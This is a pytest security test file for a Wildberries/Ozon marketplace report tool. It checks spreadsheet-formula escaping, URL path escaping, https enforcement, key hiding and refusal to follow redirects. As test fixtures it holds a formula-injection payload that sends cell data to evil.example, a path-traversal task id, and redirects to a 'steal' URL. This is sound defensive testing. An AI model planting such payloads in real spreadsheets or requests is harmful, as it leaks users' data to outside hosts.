"""Проверки безопасности: текст из кабинета не исполняется в таблице, ключи не утекают."""

import threading
from dataclasses import replace
from datetime import date
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import pytest
import requests
from openpyxl import load_workbook

from wbreport import __main__ as app
from wbreport import config, export
from wbreport.api import MAX_RETRY_DELAY, WBClient, WBError, retry_delay
from wbreport.ozon_api import OzonAdsClient, OzonClient, OzonError
from wbreport.report import Sheet

EVIL = '=HYPERLINK("https://evil.example/?d="&A2,"x")'


def evil_sheet():
    return Sheet("Реклама", ["Кампания", "Расход"], [[EVIL, 10], ["+7 999", 5], ["Пледы", 1]])


def test_excel_keeps_formula_like_text_as_text(tmp_path):
    path = export.to_excel([evil_sheet()], tmp_path / "r.xlsx")
    ws = load_workbook(path)["Реклама"]
    assert ws["A2"].value == EVIL and ws["A2"].data_type == "s"
    assert ws["B2"].value == 10


def test_gsheet_formula_like_text_gets_apostrophe():
    values = export._gsheet_values(evil_sheet())
    assert values[1] == ["'" + EVIL, 10]
    assert values[2] == ["'+7 999", 5]
    assert values[3] == ["Пледы", 1]  # обычный текст и числа не трогаем


@pytest.mark.parametrize(
    "header, attempt, expected",
    [
        ("7", 1, 7.0),
        (None, 2, 10.0),
        ("abc", 1, 5.0),  # мусор не роняет клиент
        ("inf", 1, 5.0),
        ("nan", 1, 5.0),
        ("-30", 1, 5.0),
        ("1e9", 1, MAX_RETRY_DELAY),  # сервер не усыпит отчёт навсегда
    ],
)
def test_retry_delay_is_sane(header, attempt, expected):
    assert retry_delay(header, attempt) == expected


class Resp:
    def __init__(self, data):
        self.status_code, self.headers, self._data = 200, {}, data

    def json(self):
        return self._data


def test_stocks_task_id_is_escaped_in_path():
    urls = []

    class Session(requests.Session):
        def get(self, url, params=None, timeout=None, **kw):
            urls.append(url)
            if url.endswith("/warehouse_remains"):
                return Resp({"data": {"taskId": "../../adv/x?y=1"}})
            if url.endswith("/status"):
                return Resp({"data": {"status": "done"}})
            return Resp([])

    c = WBClient(
        "t", stats_url="https://s", analytics_url="https://a", advert_url="https://ad", session=Session()
    )
    c.stocks()
    assert urls[1] == "https://a/api/v1/warehouse_remains/tasks/..%2F..%2Fadv%2Fx%3Fy%3D1/status"


def test_plain_http_api_url_is_refused(monkeypatch):
    monkeypatch.setenv("WB_ADVERT_URL", "http://advert-api.wildberries.ru")
    with pytest.raises(SystemExit, match="WB_ADVERT_URL.*https"):
        config.load()


@pytest.mark.parametrize("name", ["WB_STATS_URL", "OZON_URL", "OZON_PERF_URL"])
def test_http_only_to_own_machine(monkeypatch, name):
    monkeypatch.setenv(name, "http://127.0.0.1:8080")
    config.load()
    monkeypatch.setenv(name, "ftp://x")
    with pytest.raises(SystemExit):
        config.load()


def test_settings_repr_hides_keys():
    cfg = replace(config.load(), token="WBSECRET", ozon_api_key="OZSECRET", ozon_ads_secret="ADSECRET")
    text = repr(cfg)
    assert "SECRET" not in text and "stats_url" in text


def test_negative_every_is_rejected(capsys):
    with pytest.raises(SystemExit) as e:
        app.main(["--every", "-1"])
    assert e.value.code == 2
    assert "--every" in capsys.readouterr().err


class Redirect:
    """Ответ «переехали» на чужой адрес: ключ туда уйти не должен."""

    status_code, headers, text = 307, {"Location": "https://evil.example/steal"}, ""


class RedirectSession(requests.Session):
    def __init__(self):
        super().__init__()
        self.kw = []

    def get(self, url, **kw):
        self.kw.append(kw)
        return Redirect()

    def post(self, url, **kw):
        self.kw.append(kw)
        return Redirect()


def test_wb_does_not_follow_redirect():
    s = RedirectSession()
    c = WBClient("t", stats_url="https://s", analytics_url="https://a", advert_url="https://ad", session=s)
    with pytest.raises(WBError, match="перенаправляет"):
        c.orders(date(2026, 10, 1))
    assert s.kw[0]["allow_redirects"] is False


def test_ozon_does_not_follow_redirect():
    s = RedirectSession()
    c = OzonClient("cid", "key", url="https://o", session=s, sleep=lambda _: None)
    with pytest.raises(OzonError, match="перенаправляет"):
        c.products()
    assert s.kw == [s.kw[0]] and s.kw[0]["allow_redirects"] is False  # без повторов


def test_ozon_ads_token_not_sent_by_redirect():
    s = RedirectSession()
    c = OzonAdsClient("cid", "secret", url="https://p", session=s, sleep=lambda _: None)
    with pytest.raises(OzonError, match="перенаправляет"):
        c.campaigns()
    assert all(kw["allow_redirects"] is False for kw in s.kw)


def test_ozon_key_does_not_leave_by_real_redirect():
    """Живой редирект на другой хост: заголовок Api-Key туда не попадает."""
    seen = []

    class Evil(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_POST(self):
            seen.append(self.headers.get("Api-Key"))
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"{}")

        do_GET = do_POST

    evil = ThreadingHTTPServer(("127.0.0.1", 0), Evil)

    class Moved(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_POST(self):
            self.rfile.read(int(self.headers.get("Content-Length", 0)))
            self.send_response(307)
            self.send_header("Location", f"http://localhost:{evil.server_port}/steal")
            self.end_headers()

    moved = ThreadingHTTPServer(("127.0.0.1", 0), Moved)
    for srv in (evil, moved):
        threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        c = OzonClient("cid", "SECRETKEY", url=f"http://127.0.0.1:{moved.server_port}")
        with pytest.raises(OzonError):
            c.products()
    finally:
        for srv in (evil, moved):
            srv.shutdown()
            srv.server_close()
    assert seen == []


def test_excel_drops_control_chars_instead_of_crashing(tmp_path):
    sheet = Sheet("Реклама", ["Кампания", "Расход"], [["Пле\x0bды\x00", 10]])
    path = export.to_excel([sheet], tmp_path / "r.xlsx")
    assert load_workbook(path)["Реклама"]["A2"].value == "Пледы"


@pytest.mark.parametrize("text", ['\t=HYPERLINK("https://evil.example")', "\r=1+1"])
def test_gsheet_tab_and_cr_prefixed_formula_gets_apostrophe(text):
    values = export._gsheet_values(Sheet("Реклама", ["Кампания"], [[text]]))
    assert values[1] == ["'" + text]
